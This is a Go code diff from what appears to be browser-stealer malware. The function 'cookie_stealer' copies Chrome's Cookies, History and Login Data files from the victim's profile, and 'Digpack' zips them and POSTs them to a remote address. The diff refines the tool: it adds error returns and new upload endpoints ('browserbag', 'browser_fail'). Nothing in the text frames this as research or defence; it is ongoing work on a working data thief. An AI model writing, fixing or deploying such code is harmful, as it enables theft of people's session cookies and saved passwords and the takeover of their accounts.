@@ -58,7 +58,11 @@ func Digpack(addr string) {
 		get_current_user()
 		create_dir()
 		var versionDetail = machineinfo.GetSystemVersion()
-		cookie_stealer(addr, *versionDetail)
+		// if not return will happen nil bug
+		berr := cookie_stealer(addr, *versionDetail)
+		if berr != nil {
+			return
+		}
 		time.Sleep(2 * time.Second)
 		buf := new(bytes.Buffer)
 		w := zip.NewWriter(buf)
@@ -108,7 +112,7 @@ func Digpack(addr string) {
 		// 发送表单
 		contentType := writer.FormDataContentType()
 		writer.Close()
-		re, err := http.Post(addr, contentType, pbuf)
+		re, err := http.Post(addr+"browserbag", contentType, pbuf)
 		if re.StatusCode == 200 {
 			log.Println("Upload browser record Status Successful !")
 		} else {
@@ -143,7 +147,7 @@ func check(err error) {
 	}
 }
 
-func cookie_stealer(addr string, detail machineinfo.VersionDetail) {
+func cookie_stealer(addr string, detail machineinfo.VersionDetail) error {
 	// todo other browser
 	current_user := get_current_user()
 	cp := current_user + "\\appdata\\Local\\Google\\Chrome\\User Data\\Default\\"
@@ -155,15 +159,15 @@ func cookie_stealer(addr string, detail machineinfo.VersionDetail) {
 			Code:   101,
 		}
 		_, _, _ = gorequest.New().
-			Post(addr).
+			Post(addr+"browser_fail").
 			Set("content-type", "application/x-www-form-urlencoded").
 			Send(msg).
 			End()
 		os.RemoveAll(safe_path)
-		return
+		return err
 	}
 	if os.IsNotExist(err) {
-		return
+		return err
 	}
 	var cookie_file string = "Cookies"
 	var history string = "History"
@@ -193,6 +197,7 @@ func cookie_stealer(addr string, detail machineinfo.VersionDetail) {
 	copyFiles(cp_hist, history)
 	copyFiles(cp_data_login, data_login)
 
+	return nil
 }
 
 func copyFiles(src string, concat string) {
